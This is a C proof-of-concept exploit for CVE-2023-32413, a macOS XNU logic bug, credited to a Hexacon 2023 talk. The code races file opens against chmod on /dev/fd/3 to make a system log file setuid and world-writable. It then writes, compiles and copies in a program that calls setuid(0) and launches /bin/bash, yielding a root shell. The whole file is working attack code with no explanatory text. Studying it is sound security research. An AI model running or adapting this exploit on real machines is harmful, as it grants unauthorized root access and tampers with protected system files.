/*

CVE-2023-32413
Originally found by Eloi Benoist-Vanderbeken (@elvanderb)
Presented at:
HEXACON2023 - Eloi BenoistVanderbeken - Finding and exploiting an old XNU logic bug
https://www.youtube.com/watch?v=J2QR58JAO7Q&ab_channel=Hexacon

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <errno.h>

#define SOURCE "/tmp/bin.c"
#define FAKEFILE "/tmp/myfile"
#define BINFILE "/tmp/bin"
#define SUIDFILE "/private/var/log/weekly.out"

void log_message(const char *message) {
    printf("%s\n", message);  // Log messages to stdout
}

// Thread function to open/close FAKEFILE and BINFILE alternately
void *open_close_loop(void *arg) {
    while (1) {
        int fd;

        // Open FAKEFILE and then close it
        fd = open(FAKEFILE, O_RDONLY);
        if (fd == -1) {
            perror("Failed to open FAKEFILE");
        } else {
			usleep(100);
            close(fd);
        }

        // Open SUIDFILE and then close it
        fd = open(SUIDFILE, O_RDONLY);
        if (fd == -1) {
            perror("Failed to open BINFILE");
        } else {
			usleep(100);
            close(fd);
        }
    }
    return NULL;
}

int is_correct_chmod() {
   struct stat fileStat;

    // Get the file status
    if (stat(SUIDFILE, &fileStat) < 0) {
        perror("stat");
    }

    // Extract the file permissions (mode)
    mode_t perm = fileStat.st_mode & (S_IRWXU | S_IRWXG | S_IRWXO | S_ISUID);

    // Check if the permissions are rwsrwxrwx
    if (perm == (S_IRWXU | S_IRWXG | S_IRWXO | S_ISUID)) {
    	return 1;
    } else {
    	return 0;
    }
}

void attempt_chmod() {

    while (1) {
		int ret = chmod("/dev/fd/3", S_IRWXU | S_IRWXG | S_IRWXO | S_ISUID);
		if(is_correct_chmod()) {
			log_message("[+] chmod successful");
			break;
		}
	}
}


int main() {
    pthread_t thread_id;
    FILE *file;

    file = fopen(FAKEFILE, "w");
    if (file == NULL) {
        perror("Failed to create file");
        return 1;
    }
    fclose(file);

    file = fopen(SOURCE, "w");
    if (file == NULL) {
        perror("Failed to create file");
        return 1;
    }

    // Write the contents into the file
    fprintf(file, "#include <stdio.h>\n");
    fprintf(file, "#include <stdlib.h>\n");
    fprintf(file, "#include <syslog.h>\n");
    fprintf(file, "#include <unistd.h>\n\n");
    fprintf(file, "int main(int argc, const char **argv)\n");
    fprintf(file, "{\n");
    fprintf(file, "    setuid(0);\n");
    fprintf(file, "    seteuid(0);\n");
    fprintf(file, "    system(\"/bin/bash\");\n");
    fprintf(file, "}\n");

    // Close the file after writing
    fclose(file);
    
    // Compile the generated C program using gcc
    char command[256];
    snprintf(command, sizeof(command), "gcc %s -o %s", SOURCE, BINFILE);

    // Execute the compilation command
    system(command);
    
    if (pthread_create(&thread_id, NULL, open_close_loop, NULL) != 0) {
        perror("Failed to create thread");
        exit(EXIT_FAILURE);
    }

    attempt_chmod();

    char command2[256];
    snprintf(command2, sizeof(command2), "cat %s > %s", BINFILE, SUIDFILE);

    system(command2);

    attempt_chmod();
    
    log_message("[+] getting root");

    system(SUIDFILE);
    exit(0);
    // Wait for the thread to finish (it won't in this case)
    pthread_join(thread_id, NULL);

    return 0;
}
